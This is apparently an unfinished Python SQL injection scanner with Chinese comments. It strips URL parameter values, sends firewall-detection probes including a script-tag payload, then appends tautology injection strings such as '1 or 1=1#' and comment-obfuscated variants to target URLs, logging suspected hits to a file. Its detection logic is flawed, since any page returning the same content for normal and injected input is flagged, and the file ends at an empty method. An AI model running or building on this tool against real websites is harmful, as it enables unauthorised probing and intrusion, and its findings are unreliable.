import requests
from lxml import etree
import time

# 判断存不存在数据库并识别测试数据库
class isJudge():

    def fixDeal(self,list):
        fix_list = []
        # 在判断数据库的同时进行检测
        for t in range(len(list)):
            locating = list[t].find("=")  # 定位”=“，然后在该符号后开始进行测试
            beReplace = list[t][locating+1:]
            fix = list[t].replace(beReplace,"")  # 删掉”=“号后东西，方便接下来的测试语句拼接
            fix_list.append(fix)
        return fix_list

    def testDeal(self,fixedList):
        # 各类型数据库报错的标志信息
        mysql_ErrorDB = ["SQL syntax","syntax to use near","check the manual"]
        Microsoft_ErrorDB = ["Microsoft","ODBC"]
        Oracle_ErrorDB = ["ORACLE","ORA","Microsoft JET Database Engine"]

        # 检测防火墙
        firewallJudge = ["firewall","防火墙","非法字符","不合法参数","拦截","您的请求","内容包含危险",]

        # 测试语句集合
        testbody = ["1 and 1=1","1' and '1'=’1","1' and 1=1#","1 or 1=1#","1 or 1=1--+","1’ or 1=1#","1/**/and/**/1=1#","1'/**/and/**/1=1%23"]

        header = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
        }

        # 测试是否有防火墙语句模块
        testFire_1 = fixedList[0]+"<script>alter(1)</script>"
        testFire_2 = fixedList[0]+"1' and '1'='1'#"
        # 发送测试语句并检测响应包内容
        responseTest_1 = requests.get(testFire_1,headers=header).text
        responseTest_2 = requests.get(testFire_2,headers=header).text

        for test_1 in firewallJudge:
            status_1 = responseTest_1.find(test_1)
            if status_1 == -1:
                continue
            else:
                return -1   # 检测到防火墙，返回一个值给result，立即停止循环。为了安全起见
        for test_2 in firewallJudge:
            status_2 = responseTest_2.find(test_2)
            if status_2 == -1:
                continue
            else:
                return -1   # # 检测到防火墙，返回一个值给result，立即停止循环。为了安全起见

        # 开始进行语句测试模块，是否存在sql
        for count_1 in range(len(fixedList)):
            reqestNormal = fixedList[count_1] + "1"  # 正常请求,参数为“1”
            responseNormal = requests.get(reqestNormal, headers=header).text
            for count_2 in range(len(testbody)):
                reqestUnnormal = fixedList[count_1]+testbody[count_2]  # 不正常的测试请求，拼接语句测试
                responseUnnormal = requests.get(reqestUnnormal,headers=header).text
                # 判断是否存在sql注入
                if responseNormal == responseUnnormal:  # 测试页面与正常页面返回相同内容，即判定存在sql注入
                    with open(r"./result.txt","w",encoding="utf-8") as fp:
                        fp.write(fixedList[count_1])
                    continue
                else:
                    continue
        return "It may be possible that sql injection has been saved to:./result.txt"

    def testInput(self,):





